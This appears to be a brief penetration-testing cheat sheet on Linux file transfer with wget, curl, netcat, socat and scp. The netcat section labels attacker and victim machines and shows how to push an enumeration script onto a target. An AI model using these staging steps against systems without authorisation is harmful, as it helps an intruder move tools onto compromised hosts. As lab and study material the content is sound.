## Linux File Transfer

Wget

- wget 192.168.1.102:9999/file.txt

Curl

- curl -O http://192.168.0.101/file.txt

Netcat

On attacking machine:
- nc -lvp 4444 < file

On target machine:
- nc 192.168.1.102 4444 > file

So on the victim-machine we run nc like this:
- nc -lvp 3333 > enum.sh

And on the attacking machine we send the file like this:
- nc 192.168.1.103 < enum.sh

+ I have sometimes received this error:
This is nc from the netcat-openbsd package. An alternative nc is available

I have just run this command instead:
- nc -l 1234 > file.sh

Socat
Server receiving file:
- server$ socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt
- client$ socat -u FILE:test.txt TCP:127.0.0.1:9876
Server sending file:
- server$ socat -u FILE:test.dat TCP-LISTEN:9876,reuseaddr
- client$ socat -u TCP:127.0.0.1:9876 OPEN:out.dat,creat

SCP
Now we can copy files to a machine using scp
Copy a file:
- scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext
Copy a directory:
- scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination
